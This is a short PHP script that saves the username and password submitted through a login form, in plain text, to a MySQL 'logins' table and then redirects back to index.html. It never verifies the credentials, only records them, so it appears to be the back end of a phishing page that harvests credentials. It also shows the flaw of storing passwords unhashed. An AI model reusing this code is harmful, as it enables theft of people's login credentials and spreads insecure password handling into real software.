<?php
$servername = "localhost";  // Change this to your database server (e.g., localhost)
$username = "root";         // Change this to your database username
$password = "";             // Change this to your database password
$dbname = "login_data";     // Change this to your database name

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO logins (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $user, $pass);

// Set parameters and execute
$user = $_POST['username'];
$pass = $_POST['password'];
$stmt->execute();

$stmt->close();
$conn->close();

// Redirect back to the login page or to a success page
header("Location: index.html");
exit();
?>
